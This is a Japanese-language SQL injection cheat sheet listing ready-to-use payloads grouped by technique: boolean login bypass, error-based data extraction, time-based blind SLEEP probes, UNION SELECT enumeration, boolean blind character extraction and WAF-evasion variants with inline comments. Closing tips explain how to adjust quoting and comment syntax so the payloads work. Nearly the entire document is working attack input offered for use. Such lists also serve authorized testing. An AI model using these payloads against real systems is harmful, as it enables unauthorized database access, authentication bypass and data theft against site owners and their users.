```bash
### 🔸【基本チェック（ロジックベース）】

' OR 1=1-- 
' OR 1=1# 
' OR 'a'='a'-- 
" OR "a"="a"-- 
') OR '1'='1-- 
1' OR '1' = '1' --  


### 🔸【エラーを出すためのチェック（エラーベース）】
```bash
' AND 1=CAST((SELECT table_name FROM information_schema.tables LIMIT 1) AS INT)-- 
' ORDER BY 100-- 
' AND (SELECT 1 FROM (SELECT COUNT(*), CONCAT(0x7e, (SELECT VERSION()), 0x7e, FLOOR(RAND(0)*2)) AS a FROM information_schema.tables GROUP BY a) b)--  


### 🔸【ブラインドSQLi（時間遅延型）】
```bash
' OR SLEEP(5)-- 
' AND IF(1=1, SLEEP(5), 0)-- 
' AND (SELECT IF(1=1, SLEEP(5), 0))-- 
1 AND IF(SUBSTRING(@@version,1,1)='5', SLEEP(5), 0)-- 


### 🔸【UNIONベースのチェック】
```bash
' UNION SELECT NULL-- 
' UNION SELECT NULL,NULL-- 
' UNION SELECT 1,2,3-- 
' UNION SELECT version(), database()--  


### 🔸【Booleanベースブラインド】
```bash
' AND 1=1-- 
' AND 1=2-- 
' AND ASCII(SUBSTRING((SELECT user()),1,1))=114-- 
' AND (SELECT 1 FROM dual WHERE EXISTS(SELECT * FROM users))--  



### 🔸【WAF回避に応用される変形例】
```bash
'/**/OR/**/1=1-- 
' OR+1=1-- 
' OR/*!50000 1=1*/-- 
' OR 1=1 LIMIT 1-- 
```
## ✅ 使用時の注意点

- 入力欄がシングルクォートやダブルクォートで囲まれている場合、それに応じて調整してください。
- `--` の後には **必ず半角スペースをつける**（`--` ）こと。でないとコメントアウトと認識されません。
- `SLEEP()` は実際のサーバレスポンス時間で差を確認します（自動化ツールで測定しやすい）。